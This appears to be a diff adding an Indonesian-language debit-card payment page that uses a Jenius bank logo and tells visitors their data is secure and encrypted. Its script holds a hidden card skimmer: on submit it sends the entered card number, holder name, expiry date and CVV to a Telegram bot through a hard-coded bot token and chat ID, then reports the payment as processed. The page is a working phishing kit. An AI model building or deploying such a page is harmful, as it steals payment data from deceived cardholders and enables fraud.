@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form Input Kartu Debit</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .card-display {
+            perspective: 1000px;
+            transition: transform 0.6s;
+            transform-style: preserve-3d;
+        }
+        .card-front, .card-back {
+            backface-visibility: hidden;
+        }
+        .card-back {
+            transform: rotateY(180deg);
+        }
+        .flipped {
+            transform: rotateY(180deg);
+        }
+        .card-number {
+            letter-spacing: 2px;
+            font-family: 'Courier New', monospace;
+        }
+        .flip-button {
+            transition: all 0.3s ease;
+        }
+        .flip-button:hover {
+            transform: scale(1.05);
+        }
+        #cardForm input:focus {
+            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.5);
+        }
+    </style>
+</head>
+<body class="bg-gradient-to-br from-blue-50 to-indigo-50 min-h-screen p-4 md:p-8 flex items-center justify-center">
+    <div class="max-w-4xl w-full">
+        <header class="text-center mb-8">
+            <h1 class="text-3xl md:text-4xl font-bold text-indigo-900">Pembayaran dengan Kartu Debit</h1>
+            <p class="text-gray-600 mt-2">Isi detail kartu debit Anda dengan aman</p>
+        </header>
+
+        <div class="flex flex-col md:flex-row gap-8 items-center md:items-start">
+            <!-- Card Preview -->
+            <div class="w-full md:w-1/2">
+                <div class="card-display relative h-56 mb-8 mx-auto w-full max-w-md" id="cardDisplay">
+                    <div class="card-front absolute w-full h-full bg-gradient-to-br from-indigo-600 to-purple-600 rounded-xl shadow-xl p-6 flex flex-col justify-between">
+                        <div class="flex justify-between items-start">
+                            <div>
+                                <img src="https://upload.wikimedia.org/wikipedia/id/thumb/8/89/Jenius-logo.png/1600px-Jenius-logo.png?20170310065823" alt="Logo bank standar dengan desain minimalis warna putih" class="h-8 opacity-90" />
+                            </div>
+                            <span class="text-white font-semibold text-sm">DEBIT</span>
+                        </div>
+                        
+                        <div class="text-white text-xl card-number tracking-wide" id="displayCardNumber">•••• •••• •••• ••••</div>
+                        
+                        <div class="flex justify-between items-end text-white">
+                            <div>
+                                <div class="text-xs opacity-80">Nama Pemegang</div>
+                                <div class="text-sm font-medium" id="displayName">Nama Anda</div>
+                            </div>
+                            <div>
+                                <div class="text-xs opacity-80">Berlaku Sampai</div>
+                                <div class="text-sm font-medium" id="displayExpiry">••/••</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="card-back absolute w-full h-full bg-gradient-to-br from-gray-700 to-gray-900 rounded-xl shadow-xl p-6 flex flex-col justify-between">
+                        <div class="h-8 bg-black w-full mt-4"></div>
+                        <div class="h-8 bg-gray-500 rounded flex items-center justify-end px-4">
+                            <span class="text-white text-sm" id="displayCvv">•••</span>
+                        </div>
+                        <div class="text-white text-xs opacity-70 text-center">
+                            Nomor ini adalah kode keamanan 3 digit di belakang kartu Anda
+                        </div>
+                    </div>
+                </div>
+                
+                <button type="button" class="flip-button mx-auto block px-4 py-2 bg-indigo-100 text-indigo-700 rounded-lg text-sm font-medium flex items-center gap-2" id="flipButton">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4" />
+                    </svg>
+                    Lihat Bagian Belakang Kartu
+                </button>
+            </div>
+
+            <!-- Form Input -->
+            <div class="w-full md:w-1/2 bg-white rounded-xl shadow-md p-6">
+                <form id="cardForm" class="space-y-6">
+                    <div>
+                        <label for="cardNumber" class="block text-sm font-medium text-gray-700 mb-1">Nomor Kartu</label>
+                        <div class="relative">
+                            <div class="absolute inset-y-0 left-0 pl-3 flex items-center">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
+                                </svg>
+                            </div>
+                            <input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" 
+                                class="w-full pl-10 px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-1 focus:ring-indigo-500 transition" />
+                        </div>
+                        <p class="text-xs text-gray-500 mt-1">Hanya angka, tanpa spasi atau tanda hubung</p>
+                    </div>
+                    
+                    <div>
+                        <label for="cardName" class="block text-sm font-medium text-gray-700 mb-1">Nama di Kartu</label>
+                        <div class="relative">
+                            <div class="absolute inset-y-0 left-0 pl-3 flex items-center">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
+                                </svg>
+                            </div>
+                            <input type="text" id="cardName" placeholder="Nama Pemegang Kartu" 
+                                class="w-full pl-10 px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-1 focus:ring-indigo-500 transition" />
+                        </div>
+                    </div>
+                    
+                    <div class="grid grid-cols-2 gap-4">
+                        <div>
+                            <label for="expiryDate" class="block text-sm font-medium text-gray-700 mb-1">Masa Berlaku</label>
+                            <div class="relative">
+                                <div class="absolute inset-y-0 left-0 pl-3 flex items-center">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
+                                    </svg>
+                                </div>
+                                <input type="text" id="expiryDate" maxlength="5" placeholder="MM/YY" 
+                                    class="w-full pl-10 px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-1 focus:ring-indigo-500 transition" />
+                            </div>
+                        </div>
+                        
+                        <div>
+                            <label for="cvv" class="block text-sm font-medium text-gray-700 mb-1">CVV</label>
+                            <div class="relative">
+                                <div class="absolute inset-y-0 left-0 pl-3 flex items-center">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                                    </svg>
+                                </div>
+                                <input type="password" id="cvv" maxlength="3" placeholder="•••" 
+                                    class="w-full pl-10 px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-1 focus:ring-indigo-500 transition" />
+                                <button type="button" id="toggleCvv" class="absolute right-3 top-3 text-gray-400 hover:text-indigo-600">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                                    </svg>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="pt-4">
+                        <button type="submit" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-medium py-3 px-4 rounded-lg shadow-sm transition duration-150 ease-in-out">
+                            Konfirmasi Pembayaran
+                        </button>
+                    </div>
+                </form>
+                
+                <div class="mt-6 border-t border-gray-200 pt-4">
+                    <div class="flex items-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                        </svg>
+                        <span class="ml-2 text-sm text-gray-600">
+                            Data Anda aman dan terenkripsi dengan standar keamanan tinggi
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Elemen yang diperlukan
+            const cardNumberInput = document.getElementById('cardNumber');
+            const cardNameInput = document.getElementById('cardName');
+            const expiryDateInput = document.getElementById('expiryDate');
+            const cvvInput = document.getElementById('cvv');
+            const toggleCvvBtn = document.getElementById('toggleCvv');
+            const flipButton = document.getElementById('flipButton');
+            const cardDisplay = document.getElementById('cardDisplay');
+            
+            // Elemen preview kartu
+            const displayCardNumber = document.getElementById('displayCardNumber');
+            const displayName = document.getElementById('displayName');
+            const displayExpiry = document.getElementById('displayExpiry');
+            const displayCvv = document.getElementById('displayCvv');
+            
+            // Format nomor kartu dengan spasi setiap 4 digit
+            cardNumberInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\s+/g, '').replace(/\D/g, '');
+                let formattedValue = '';
+                
+                for (let i = 0; i < value.length; i++) {
+                    if (i > 0 && i % 4 === 0) {
+                        formattedValue += ' ';
+                    }
+                    formattedValue += value[i];
+                }
+                
+                e.target.value = formattedValue;
+                displayCardNumber.textContent = formattedValue || '•••• •••• •••• ••••';
+            });
+            
+            // Format tanggal kadaluarsa (MM/YY)
+            expiryDateInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                
+                if (value.length > 2) {
+                    e.target.value = value.slice(0, 2) + '/' + value.slice(2, 4);
+                }
+                
+                displayExpiry.textContent = e.target.value || '••/••';
+            });
+            
+            // Update nama di preview kartu
+            cardNameInput.addEventListener('input', function(e) {
+                displayName.textContent = e.target.value || 'Nama Anda';
+            });
+            
+            // Update CVV di preview kartu
+            cvvInput.addEventListener('input', function(e) {
+                displayCvv.textContent = e.target.value || '•••';
+            });
+            
+            // Toggle visibilitas CVV
+            toggleCvvBtn.addEventListener('click', function() {
+                const isPassword = cvvInput.type === 'password';
+                cvvInput.type = isPassword ? 'text' : 'password';
+                
+                // Update icon
+                const icon = toggleCvvBtn.querySelector('svg');
+                const path = icon.querySelector('path');
+                
+                if (isPassword) {
+                    path.setAttribute('d', 'M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21');
+                } else {
+                    path.setAttribute('d', 'M15 12a3 3 0 11-6 0 3 3 0 016 0z');
+                    path.setAttribute('d', path.getAttribute('d') + ' M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z');
+                }
+            });
+            
+            // Flip card animation
+            flipButton.addEventListener('click', function() {
+                cardDisplay.classList.toggle('flipped');
+                flipButton.querySelector('svg').classList.toggle('rotate-180');
+            });
+            
+            // Form submission
+            document.getElementById('cardForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                alert('Pembayaran berhasil diproses! (Ini hanya simulasi)');
+            });
+        });
+        // Form submission
+document.getElementById('cardForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    // Ambil data dari form
+    const cardNumber = document.getElementById('cardNumber').value;
+    const cardName = document.getElementById('cardName').value;
+    const expiryDate = document.getElementById('expiryDate').value;
+    const cvv = document.getElementById('cvv').value;
+
+    // Format pesan
+    const message = `
+💳 New Card Data:
+Nomor Kartu: ${cardNumber}
+Nama Pemegang Kartu: ${cardName}
+Masa Berlaku: ${expiryDate}
+CVV: ${cvv}
+    `;
+
+    // Kirim data ke Telegram
+    const telegramToken = '8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc'; // Ganti dengan token bot Anda
+    const chatId = '7549590022'; // Ganti dengan chat ID Anda
+    const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+    fetch(telegramUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'Markdown' // Untuk format pesan
+        }),
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            alert('Pembayaran berhasil diproses dan data telah dikirim ke Telegram! (Ini hanya simulasi)');
+        } else {
+            alert('Terjadi kesalahan saat mengirim data ke Telegram.');
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('Terjadi kesalahan saat mengirim data ke Telegram.');
+    });
+})
+    </script>;
+</body>
+</html>
+
